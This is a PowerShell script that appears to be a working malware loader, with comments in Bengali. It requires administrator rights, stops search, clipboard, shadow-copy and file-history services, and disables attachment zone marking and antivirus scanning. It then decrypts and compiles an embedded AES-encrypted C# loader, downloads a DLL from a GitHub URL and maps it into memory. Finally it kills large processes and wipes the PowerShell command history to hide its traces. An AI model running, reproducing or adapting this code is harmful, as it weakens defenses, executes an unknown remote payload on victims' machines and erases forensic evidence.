Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Set-StrictMode -Version Latest

$VerbosePreference      = 'SilentlyContinue'
$DebugPreference        = 'SilentlyContinue'
$InformationPreference  = 'SilentlyContinue'
$WarningPreference      = 'SilentlyContinue'
$ErrorActionPreference  = 'SilentlyContinue'
$ConfirmPreference                 = 'None'
$WhatIfPreference                  = $false
$PSModuleAutoLoadingPreference     = 'None'
$MaximumHistoryCount               = 0

*> $null
$Error.Clear()

[string] $script:vcPath        = $null
[System.IO.DirectoryInfo] $script:OpenSSHRoot = $null
[System.IO.DirectoryInfo] $script:gitRoot     = $null
[bool]   $script:Verbose       = $false
[string] $script:BuildLogFile  = $null



Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

function Invoke-Finalize {
    try {
        Get-Variable -Scope Script -ErrorAction SilentlyContinue |
            Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
        Get-Variable | Where-Object {
            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
        } | Remove-Variable -Force -ErrorAction SilentlyContinue
        Clear-Host
        $Error.Clear()
        [GC]::Collect()
        [GC]::WaitForPendingFinalizers()
        [GC]::Collect()
        Get-Process | ForEach-Object { $_.MinWorkingSet = $_.MinWorkingSet }
        Get-Process | Where-Object {$_.WorkingSet -gt 300MB} | Stop-Process -Force
    }
    catch {}
}

if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
{
    Invoke-Finalize
    return
}

# --------------------------------------------------------------------
# ১) তোমার জেনারেট করা এনক্রিপ্টেড ডেটা (তোমার আউটপুট থেকে কপি)
# --------------------------------------------------------------------
$encryptedBase64 = "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"

$keyBase64       = "7/qg584Xcr6uo4g305OJTz4kQw3mxBKEEPF7eZKbDhM="
$ivBase64        = "y1CVfL1gJCgbvw6Lfr+A0A=="

# --------------------------------------------------------------------
# ২) ডিক্রিপশন ফাংশন
# --------------------------------------------------------------------
function Get-DecryptedKernel {
    param(
        [string]$encB64,
        [string]$keyB64,
        [string]$ivB64
    )
    $encBytes = [Convert]::FromBase64String($encB64)
    $key      = [Convert]::FromBase64String($keyB64)
    $iv       = [Convert]::FromBase64String($ivB64)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV  = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes.CreateDecryptor()
    $plainBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
}

# --------------------------------------------------------------------
# ৩) ডিক্রিপ্ট করে কম্পাইল করো
# --------------------------------------------------------------------
$kernel = Get-DecryptedKernel -encB64 $encryptedBase64 -keyB64 $keyBase64 -ivB64 $ivBase64

try {
    $null = Add-Type -TypeDefinition $kernel -ErrorAction Stop
} catch {
    Write-Error "ডিক্রিপশন বা কম্পাইলে সমস্যা। Base64 গুলো ঠিক আছে কিনা চেক করো।"
    Invoke-Finalize
    return
}

# --------------------------------------------------------------------
# ৪) DLL ডাউনলোড ও ম্যানুয়াল ম্যাপ
# --------------------------------------------------------------------
$bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/rsindian511-star/69s/raw/refs/heads/main/PlayBoyCorp.RuntimeLdr.dll")
[NativeLoader]::Map($bytes, $true)

Invoke-Finalize

Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
}



$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (-not (Test-Path $historyPath)) {
    New-Item -Path $historyPath -ItemType File -Force | Out-Null
} else {
    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
}
